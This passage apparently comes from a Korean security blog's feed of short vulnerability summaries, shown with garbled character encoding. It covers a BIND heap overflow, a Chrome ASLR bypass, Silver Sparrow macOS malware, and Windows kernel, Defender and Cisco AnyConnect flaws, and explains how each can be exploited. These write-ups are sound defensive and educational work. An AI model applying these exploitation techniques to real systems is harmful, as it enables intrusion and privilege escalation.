class="hljs-keyword">sizeof</span>(*data-&gt;components));   <span class="hljs-comment">// &lt;-- (1) </span>    <span class="hljs-keyword">if</span> (data-&gt;components == <span class="hljs-literal">NULL</span>) &#123;       <span class="hljs-keyword">return</span> (ENOMEM);     &#125;     data-&gt;components[<span class="hljs-number">0</span>] = (*p) / <span class="hljs-number">40</span>;    <span class="hljs-comment">// &lt;-- (2) </span>    data-&gt;components[<span class="hljs-number">1</span>] = (*p) % <span class="hljs-number">40</span>;     --len;               <span class="hljs-comment">// &lt;-- (3) </span>    ++p;     <span class="hljs-keyword">for</span> (n = <span class="hljs-number">2</span>; len &gt; <span class="hljs-number">0U</span>; ++n) &#123;         <span class="hljs-keyword">unsigned</span> u = <span class="hljs-number">0</span>;          <span class="hljs-keyword">do</span> &#123;             --len;             u = u * <span class="hljs-number">128</span> + (*p++ % <span class="hljs-number">128</span>);         &#125; <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0U</span> &amp;&amp; p[<span class="hljs-number">-1</span>] &amp; <span class="hljs-number">0x80</span>);         data-&gt;components[n] = u;      <span class="hljs-comment">// &lt;-- (4) </span>    &#125; <span class="hljs-comment">// ... </span>&#125;</code></pre><p>í™ ì˜¤ë²„í”Œë¡œìš° ë²„ê·¸ê°€ ì¡´ì¬í•˜ëŠ” lib/dns/spnego.cì˜ í•¨ìˆ˜ <code>der_get_old()</code> ì¼ë¶€ì…ë‹ˆë‹¤. </p><p>(1): ë°°ì—´í˜• ë²„í¼ë¥¼ í• ë‹¹í•˜ê³  len ë³€ìˆ˜ë¥¼ í†µí•´ ë²„í¼ì— ë‚¨ì•„ìˆëŠ” element ìˆ˜ë¥¼ ì¶”ì í•©ë‹ˆë‹¤.</p><p>(2): ë²„í¼ì— 2ê°œì˜ elementë¥¼ ë‹´ìŠµë‹ˆë‹¤. </p><p>(3): lenì˜ ê°’ì„ 1ë²ˆë§Œ ê°ì†Œì‹œí‚µë‹ˆë‹¤.</p><p>(4): í•œ ê°œì˜ int element(4 byte) ë§Œí¼ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í•´ì»¤ëŠ” ì„œë²„ë¡œ ì¡°ì‘ëœ requestë¥¼ ë³´ë‚´ <code>der_get_old()</code>ê°€ í• ë‹¹í•˜ëŠ” ë²„í¼ì˜ í¬ê¸°ì™€ ê·¸ ë°ì´í„°ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆê³ , <code>der_get_old()</code>ë¥¼ í˜¸ì¶œí•˜ëŠ” loop countë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì—°ì†ëœ í™ ì²­í¬ì˜ ì¬í• ë‹¹ì„ ìœ ë„í•´ exploitì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>heap</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] íŒ¨ì¹˜í•˜ì§€ ì•Šê² ë‹¤ê³  ë°íŒ Chromeì˜ garbage collectorë¥¼ í†µí•œ ASLR bypass ì·¨ì•½ì </title>
    <link href="/2021/02/26/l0ch/2021-02-26/"/>
    <url>/2021/02/26/l0ch/2021-02-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1144662">Bypassing ASLR using Oilpanâ€™s conservative garbage collector</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Googleì˜ ì˜¤í”ˆì†ŒìŠ¤ ë¸Œë¼ìš°ì €ì¸ Chromeì—ì„œ ASLRì„ ìš°íšŒí•´ ë§¤í•‘ëœ ë©”ëª¨ë¦¬ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì˜ ì •ë³´ì™€ PoCê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Chromeì˜ V8 ì—”ì§„ì€ Oilpan garbage collectorë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. Oilpan garbage collectorëŠ” ìˆ˜ì§‘í•  í¬ì¸í„°ë¥¼ ì°¾ê¸° ìœ„í•´ ìŠ¤íƒì„ ìŠ¤ìº”í•˜ëŠ”ë°, ì •ìˆ˜ì™€ í¬ì¸í„°ì˜ í˜•ì‹ì„ êµ¬ë¶„í•˜ì§€ ì•Šì•„ ì •ìˆ˜ê°€ í• ë‹¹ëœ ê°ì²´ ë˜í•œ í¬ì¸í„°ë¡œ ê°€ì •í•´ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì„ì˜ì˜ ì£¼ì†Œì— ì–´ë–¤ ê°ì²´ê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ê°ì²´ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.</li><li>ì„ì˜ì˜ ì£¼ì†Œ ê°’ ì •ìˆ˜ë¥¼ ìŠ¤íƒì— ë„£ìŠµë‹ˆë‹¤.<ul><li>ì´ë•Œ ì¶©ë¶„í•œ ìˆ˜ì˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ ë§¤ê°œ ë³€ìˆ˜ìš©ìœ¼ë¡œ ì˜ˆì•½ëœ ë ˆì§€ìŠ¤í„°ë¥¼ ëª¨ë‘ ì‚¬ìš©í•œ ë’¤ garbage collectorê°€ ìŠ¤ìº”í•˜ëŠ” ìŠ¤íƒì— ë‚˜ë¨¸ì§€ ë§¤ê°œ ë³€ìˆ˜ê°€ ì €ì¥ë˜ì–´ ì„ì˜ì˜ ë°ì´í„°ë¥¼ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ê°ì²´ì— ëŒ€í•œ ëª¨ë“  ì°¸ì¡°ë¥¼ ì œê±°í•˜ê³  garbage collectionì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.</li><li>ê°ì²´ê°€ í™œì„±í™”ëœ ìƒíƒœë©´ ì„ì˜ì˜ ì£¼ì†Œê°€ ëŒ€ìƒ ê°ì²´ë¥¼ ê°€ë¦¬í‚´ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/FinalizationRegistry">FinalizationRegistry</a> ë¥¼ ì‚¬ìš©í•´ ê°ì²´ê°€ garbage collectorì— ì˜í•´ ìˆ˜ì§‘ë  ë•Œ í˜¸ì¶œë˜ëŠ” ê°ì²´ì— ëŒ€í•œ ì½œë°±ì„ ì§€ì •í•˜ë©´ ê°ì²´ê°€ garbage collectionì´ íŠ¸ë¦¬ê±° ëœ ì´í›„ í™œì„±í™”ëœ ìƒíƒœì¸ì§€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li></ol><p>ê³µê°œëœ macOS ë²„ì „ì˜ PoCë¥¼ ì‹¤í–‰í•œ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ìœ¼ë©° Windows, Linux ë“± ë‹¤ë¥¸ í”Œë«í¼ì˜ Chromeì—ì„œë„ ë™ì¼í•œ ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><p><img src="/2021/02/26/l0ch/2021-02-26/image.png"></p><p>ê·¸ëŸ¬ë‚˜ Google ì¸¡ì€ í•´ë‹¹ ì·¨ì•½ì  ë³´ê³ ì„œì— ëŒ€í•´ <code>WontFix</code>ë¥¼ í• ë‹¹í–ˆìœ¼ë©° ì·¨ì•½ì ì„ì„ ì¸ì§€í•˜ì˜€ìœ¼ë‚˜ ì–´ë– í•œ íŒ¨ì¹˜ë‚˜ ë³´ìƒ ê³„íšì´ ì—†ì„ ê²ƒì´ë¼ê³  ë°í˜”ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chrome</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>wontfix</tag>
      
      <tag>garbage collector</tag>
      
      <tag>aslr bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ì•½ 3ë§Œ ëŒ€ì˜ Apple Macì„ ê°ì—¼ì‹œí‚¨ Silver Sparrow ì•…ì„±ì½”ë“œ</title>
    <link href="/2021/02/25/idioth/2021-02-25/"/>
    <url>/2021/02/25/idioth/2021-02-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://redcanary.com/blog/clipping-silver-sparrows-wings/">Clipping Silver Sparrowâ€™s wings: Outing macOS malware before it takes flight</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Intel x86_64, M1 chips MAC</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Appleì˜ ìƒˆë¡œìš´ M1 ARM64 ì•„í‚¤í…ì²˜ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ í•œ ì•…ì„±ì½”ë“œ Silver Sparrowê°€ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Silver SparrowëŠ” Intel x86_64 ì•„í‚¤í…ì²˜ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ ì»´íŒŒì¼ëœ ë²„ì „ê³¼, Inter x86_64 ë° M1 ARM64 ì•„í‚¤í…ì²˜ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ ì»´íŒŒì¼ëœ ë²„ì „ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë‘ ë²„ì „ ëª¨ë‘ macOS Installer Javascript APIë¥¼ í™œìš©í•˜ì—¬ ë™ì ìœ¼ë¡œ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±í•˜ì—¬ ê³µê²© ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. <code>agent.sh</code> ìŠ¤í¬ë¦½íŠ¸ëŠ” AWS C2 ì„œë²„ì— ì„¤ì¹˜ê°€ ì™„ë£Œë˜ì—ˆìŒì„ ì•Œë¦¬ê³ , <code>verx.sh</code>ëŠ” ì£¼ê¸°ì ìœ¼ë¡œ C2 ì„œë²„ì— ì¶”ê°€ì ìœ¼ë¡œ ë‹¤ìš´ë¡œë“œí•˜ê±°ë‚˜ ì‹¤í–‰í•  ì»¨í…ì¸ ê°€ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><p>Intel x86_64ìš© ë°”ì´ë„ˆë¦¬ì˜ ê²½ìš°, ì¶”ê°€ì ì¸ ê¸°ëŠ¥ ì—†ì´ ì‹¤í–‰ ì‹œ â€œHello, World!â€ê°€ í™”ë©´ì— ì¶œë ¥ë˜ë©°, M1 ARM64ìš© ë°”ì´ë„ˆë¦¬ ë˜í•œ â€œYou did it!â€ì„ ì¶œë ¥í•©ë‹ˆë‹¤.</p><p>Silver SparrowëŠ” í˜„ì¬ ë³„ë‹¤ë¥¸ ê¸°ëŠ¥ì„ ìˆ˜í–‰í•˜ì§€ ì•Šê³  ìˆì§€ë§Œ, ì–´ë– í•œ ëª©ì ì„ ê°€ì§€ê³  ìˆëŠ”ì§€ ë¶ˆë¶„ëª…í•˜ë©° í˜ì´ë¡œë“œê°€ ì´ë¯¸ ì „ë‹¬ë˜ê³  ì œê±° ë˜ì—ˆëŠ”ì§€, í–¥í›„ ì¶”ê°€ ë°°í¬ ì¼ì •ì´ ìˆëŠ”ì§€, ì•…ì„±ì½”ë“œì— ì˜í•´ ì–´ë–¤ í˜ì´ë¡œë“œê°€ ë°°í¬ë˜ì—ˆëŠ”ì§€ ì•Œ ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ì—†ìœ¼ë©° M1 ì¹©ì„ íƒ€ê²Ÿìœ¼ë¡œ ì ì¬ì ì¸ ê³µê²© ê°€ëŠ¥ì„±ì´ ì¡´ì¬í•˜ë¯€ë¡œ ì‹¬ê°í•œ ìœ„í˜‘ì´ë¼ê³  ë°í˜”ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>m1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-1732: win32kfull.sys 0-day</title>
    <link href="/2021/02/24/fabu1ous/2021-02-24/"/>
    <url>/2021/02/24/fabu1ous/2021-02-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/">WINDOWS KERNEL ZERO-DAY EXPLOIT (CVE-2021-1732) IS USED BY BITTER APT IN TARGETED ATTACK</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows10 1709 ~ 1909 64-bits</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>DBAPPSecurity Threat Intelligenceê°€ ì‘ë…„ 12ì›”ì— BITTER APTì˜ ìƒˆë¡œìš´ ì»´í¬ë„ŒíŠ¸ë¥¼ ë¶„ì„í•´ win32kfull.sysì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì (CVE-2021-1732)ì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. CVE-2021-1732ëŠ” win32kfull ì½œë°±ì— ì˜í•´ ë°œìƒí•˜ëŠ” System ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ìœ¼ë¡œ IE browser, Adobe Reader ë“±ì˜ sandbox escapeì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì (out-of-bound access)ì€ <code>win32kfull!xxxCreateWindowEx</code>ê°€ ì½œë°± í•¨ìˆ˜ <code>xxxClientAllocWindowClassExtraBytes</code>ë¥¼ í˜¸ì¶œí•œ í›„, ì»¤ë„ êµ¬ì¡° ë©¤ë²„ì— ëŒ€í•œ ì„¤ì •ê³¼ flagê°’ì´ ì„œë¡œ ìƒì‘í•˜ì§€ ì•Šì„ ë•Œ ë°œìƒí•©ë‹ˆë‹¤.</p><p><code>win32kfull!xxxCreateWindowEx</code>ê°€ <code>WndExtra</code> ì˜ì—­ì„ ê°–ëŠ” ìƒˆë¡œìš´ ì°½ì„ ë§Œë“¤ ë•Œ ì½œë°± í•¨ìˆ˜ <code>user32!_xxxClientAllocWindowClassExtraBytes</code>ë¥¼ í˜¸ì¶œí•´ <code>WndExtra</code>ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. ê·¸ í›„ í• ë‹¹ëœ <code>WndExtra</code>ì˜ ìœ ì € ëª¨ë“œ í¬ì¸í„°ë¥¼ ë°˜í™˜ë°›ì•„ <code>WndExtra</code> ë©¤ë²„ì— ì €ì¥í•©ë‹ˆë‹¤.</p><p>ë§Œì•½ ì»¤ìŠ¤í…€ ì½œë°± <code>_xxxClientAllocWindowClassExtraBytes</code>ì—ì„œ <code>win32kfull!ConsoleControl</code>ì„ í˜¸ì¶œí•´ í˜„ì¬ ì°½ì— ëŒ€í•œ í•¸ë“¤ì„ ë°›ìœ¼ë©´ ì €ì¥ëœ <code>WndExtra</code> ë©¤ë²„ë¥¼ ì˜¤í”„ì…‹ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤. ë˜í•œ ê·¸ì— ë§ê²Œ flagëŠ” í˜„ì¬ ë©¤ë²„ê°€ ì˜¤í”„ì…‹ì„ì„ ë‚˜íƒ€ë‚´ë„ë¡(0x800) ê°’ì´ ë³€ê²½ë©ë‹ˆë‹¤.</p><p>ì»¤ìŠ¤í…€ ì½œë°±ì´ ëë‚œ ì§í›„ <code>NtCallbackReturn</code>ë¥¼ í†µí•´ ì„ì˜ì˜ ê°’(fake_offset)ì„  <code>win32kfull!xxxCreateWindowEx</code>ì— ë°˜í™˜í•˜ë©´ <code>WndExtra</code> ë©¤ë²„ë¥¼  í•´ë‹¹ ë°˜í™˜ ê°’ìœ¼ë¡œ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ flagê°’ì€ ì—¬ì „íˆ <code>WndExtra</code> ë©¤ë²„ê°€ ì˜¤í”„ì…‹ì„ì„ ë‚˜íƒ€ë‚´ê¸° ë•Œë¬¸ì— ì»¤ë„ í™ í•´ì œ ì‹œ ë°œìƒí•˜ëŠ” ë¶„ê¸°ì— ì˜í–¥ì„ ë¯¸ì¹˜ê²Œ ë©ë‹ˆë‹¤.</p><p><code>win32kfull!xxxFreeWindow</code>ëŠ”</p><ol><li><p>Flagê°’ ì„¤ì •ë¨</p><p>ì˜¤í”„ì…‹ì„ í†µí•´ <code>WndExtra</code>ë¥¼ free í•˜ëŠ” <code>RtlFreeHeap</code> í˜¸ì¶œ</p></li><li><p>Flagê°€ ì„¤ì •ë˜ì§€ ì•ŠìŒ</p><p>ìœ ì € ëª¨ë“œ í¬ì¸í„°ì™€ <code>xxxClientFreeWindowClassExtraBytes</code>ë¥¼ í†µí•´ <code>WndExtra</code>ë¥¼ free</p></li></ol><p><code>RtlFeeHeap</code>ì€ Base+offsetì´ ì•„ë‹Œ Base+fake_offsetì„ free í•˜ê²Œ ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>sandbox escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-1647: Windows Defender MpEngine ëª¨ë“ˆì˜ RCE ì·¨ì•½ì </title>
    <link href="/2021/02/23/l0ch/2021-02-23/"/>
    <url>/2021/02/23/l0ch/2021-02-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.anquanke.com/post/id/231625">Analysis of CVE-2021-1647 vulnerability exploitation techniques</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Malware Protection Engine â‰¤ 1.1.17600.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì‹¤ì œ í•´ì»¤ë“¤ì´ í™œë°œí•˜ê²Œ ì•…ìš©í•˜ê³  ìˆëŠ” ê²ƒìœ¼ë¡œ í™•ì¸ëœ Windows Defenderì˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. </p><p>ì·¨ì•½ì ì€ Asprotectë¡œ íŒ¨í‚¹ëœ PE íŒŒì¼ì„ ì••ì¶• í•´ì œí•˜ëŠ” <code>CAsprotectDLLAndVersion::RetrieveVersionInfoAndCreateObjects</code> í•¨ìˆ˜ì— ì¡´ì¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs c">...<span class="hljs-keyword">for</span> (i = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)v2 + <span class="hljs-number">28</span>); ; i += <span class="hljs-number">2</span> )&#123;<span class="hljs-keyword">if</span> ( v28 &gt;= <span class="hljs-number">3</span> )v83 = (*((_DWORD *)v2 + <span class="hljs-number">14</span>) + <span class="hljs-number">4095</span>) &amp; <span class="hljs-number">0xFFFFF000</span>;sectionindex = i64; v33 = (_DWORD ((<span class="hljs-keyword">char</span> *)v2 + <span class="hljs-number">32</span>); v34 = (__int64) v2 + <span class="hljs-number">32</span>; <span class="hljs-keyword">while</span> ( sectionindex &lt; <span class="hljs-number">4</span> )&#123;<span class="hljs-keyword">if</span> (*(_DWORD *)(v34 - <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFFF</span> )<span class="hljs-keyword">goto</span> LABEL_123; <span class="hljs-keyword">if</span> (*(_DWORD *)(v34 - <span class="hljs-number">4</span>) &gt; sectionva )&#123;sectionva = *(_DWORD *)(v34 - <span class="hljs-number">4</span>); sectionsize = (*(_DWORD *)v34 + <span class="hljs-number">4095</span>) &amp; <span class="hljs-number">0xFFFFF000</span>;&#125;v35 = v82[sectionindex++]; V34 += <span class="hljs-number">8</span>i64; <span class="hljs-keyword">if</span> ( v35 &lt;= v27 )v35 = v27;v27 = v35;&#125;...</code></pre><p>ì„¹ì…˜ ë°°ì—´ <code>v2 + 28</code>ì—ëŠ” 8 bytes í¬ê¸°ì¸ 4ê°œì˜ ë°°ì—´ ìš”ì†Œê°€ ìˆìŠµë‹ˆë‹¤. ì²« 4 bytesëŠ” ì„¹ì…˜ì˜ virtual addressë¥¼ ë‚˜íƒ€ë‚´ëŠ” <code>sectionva</code>ì´ë©° ë§ˆì§€ë§‰ 4 bytesëŠ” ì„¹ì…˜ì˜ í¬ê¸°ë¥¼ ë‚˜íƒ€ë‚´ëŠ” <code>sectionsize</code>ì…ë‹ˆë‹¤.  í•´ë‹¹ í•¨ìˆ˜ëŠ” <code>sectionsize</code>ì™€ <code>sectionva</code> ë¥¼ êµ¬í•œ ë’¤ ì´ ë‘˜ì„ ë”í•œ í¬ê¸°ì˜ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•´ ì••ì¶• í•´ì œëœ ì„¹ì…˜ì„ ì €ì¥í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ <code>sectionva</code> í¬ê¸°ê°€ ì´ì „ <code>sectionva</code> í¬ê¸°ì™€ ê°™ì€ ê²½ìš°ë¥¼ ê³ ë ¤í•˜ì§€ ì•Šì•„ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>ì„¹ì…˜ ë°°ì—´ì´ <code>[0,0], [0,0], [0x2000,0], [0x2000,0x3000]</code> ë¡œ ë§ˆì§€ë§‰ <code>sectionva</code>ì™€ ì´ì „ <code>sectionva</code> ê°’ì´ ê°™ì€ ê²½ìš° í• ë‹¹ëœ ë©”ëª¨ë¦¬ëŠ” <code>0x2000 + 0 = 0x2000</code> ê°€ ë˜ì–´ ë§ˆì§€ë§‰ <code>sectionsize</code>ì¸ <code>0x3000</code> í¬ê¸° ì„¹ì…˜ì˜ ì••ì¶•ì„ í’€ ë•Œ heap overflowê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ ê°ì²´ì™€ í¬ì¸í„° í•„ë“œë¥¼ ì¡°ì‘í•´ arbitrary read/writeë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê³  ì›ê²© ì½”ë“œ ì‹¤í–‰ê¹Œì§€ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ Windows Defenderì˜ íŒŒì¼ ìŠ¤ìº” ê³¼ì •ì—ì„œ íŠ¸ë¦¬ê±° ë˜ë¯€ë¡œ ë‹¨ìˆœíˆ í•´ì»¤ê°€ ì œì‘í•œ ì•…ì„± íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œí•˜ê¸°ë§Œ í•´ë„ íŠ¸ë¦¬ê±°ê°€ ê°€ëŠ¥í•œ ì ì—ì„œ ì‹¬ê°í•œ ì·¨ì•½ì ìœ¼ë¡œ í‰ê°€ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>heap buffer overflow</tag>
      
      <tag>windows defender</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-1366: Cisco AnyConnect Posture(HostScan) Local Privilege Escalation</title>
    <link href="/2021/02/22/idioth/2021-02-22/"/>
    <url>/2021/02/22/idioth/2021-02-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.coresecurity.com/core-labs/articles/analysis-cisco-anyconnect-posture-hostscan-local-privilege-escalation-cve-2021">Analysis of Cisco AnyConnect Posture (HostScan) Local Privilege Escalation: CVE-2021-1366</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco AnyConnect Posture 4.9.05042 ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Cisco AnyConnect Postureì—ì„œ DLL í•˜ì´ì¬í‚¹ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Cisco AnyConnect PostureëŠ” AnyConnect Secure Mobility Clientì—ì„œ ì„ íƒí•˜ì—¬ ì„¤ì¹˜í•  ìˆ˜ ìˆëŠ” ëª¨ë“ˆì…ë‹ˆë‹¤. í•´ë‹¹ ëª¨ë“ˆì„ ì‚¬ìš©í•˜ë©´ VPN í´ë¼ì´ì–¸íŠ¸ê°€ í˜¸ìŠ¤íŠ¸ì— ì„¤ì¹˜ëœ ìš´ì˜ ì²´ì œ, ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤, ì•ˆí‹° ìŠ¤íŒŒì´ì›¨ì–´, ë°©í™”ë²½ì„ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>AnyConnect Posture(ciscod.exe)ì˜ Cisco Security Service Windows ì„œë¹„ìŠ¤ëŠ” localhost 1023 í¬íŠ¸ì—ì„œ ë¡œì»¬ peerì˜ ì—°ê²°ì„ ëŒ€ê¸°í•©ë‹ˆë‹¤. ë¡œì»¬ peerê°€ ì—°ê²°ë˜ë©´, <code>lphlpapi.dll</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ <code>GetExtendedTcpTable</code> í•¨ìˆ˜ë¥¼ í†µí•´ ë¡œì»¬ í´ë¼ì´ì–¸íŠ¸ì˜ PIDì— í•´ë‹¹í•˜ëŠ” ì‹¤í–‰ íŒŒì¼ì„ ì°¾ìŠµë‹ˆë‹¤. ê·¸ í›„ ì—°ê²°ëœ í”„ë¡œì„¸ìŠ¤ê°€ â€œCisco System, Incâ€ ì„œëª…ì„ ê°€ì¡ŒëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><p>ì„œëª… ê²€ì‚¬ë¥¼ í†µê³¼í•˜ë©´, íŠ¹ì • í¬ë§·ìœ¼ë¡œ ëœ íŒ¨í‚·ì„ í†µí•´ ëª…ë ¹ì–´ë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤. <code>process_ipc_message</code> í•¨ìˆ˜ì—ì„œ íŒ¨í‚·ì˜ ì²« 4ë°”ì´íŠ¸ê°€ 0x2E24ì¸ì§€ í™•ì¸í•œ í›„, ë‹¤ìŒ 4ë°”ì´íŠ¸ê°€ ìœ íš¨í•œ ëª…ë ¹ì–´ì¸ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><p>ì´ ì¤‘ <code>priv_file_copy</code> ëª…ë ¹ì–´ëŠ” ëª¨ë“  ìœ„ì¹˜ì—ì„œ <code>%ProgramFiles(x86)%\Cisco\Cisco HostScan</code> ë””ë ‰í„°ë¦¬ ë‚´ì˜ ì„œë¸Œ ë””ë ‰í„°ë¦¬ë¡œ íŒŒì¼ì„ ë³µì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. directory traversalì„ ê²€ì‚¬í•˜ë¯€ë¡œ, source fileì€ <code>\Cisco\Cisco HostScan</code> ë””ë ‰í„°ë¦¬ ë‚´ë¶€ì— ìœ„ì¹˜í•˜ì—¬ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì›í•˜ëŠ” DLLì„ ë³µì‚¬í•˜ì—¬, ì„œë¹„ìŠ¤ê°€ ì‹œì‘ë  ë•Œ í•´ë‹¹ DLLì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ì¼ë°˜ ìœ ì €ê°€ ì„œë¹„ìŠ¤ë¥¼ ì¤‘ì§€/ì‹œì‘í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ì¬ë¶€íŒ… ì—†ì´ ê¶Œí•œ ìƒìŠ¹ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ <code>priv_get_device_id</code> ëª…ë ¹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì„œë¹„ìŠ¤ê°€ ì´ ëª…ë ¹ì–´ë¥¼ ë°›ìœ¼ë©´, <code>/lib</code> ë””ë 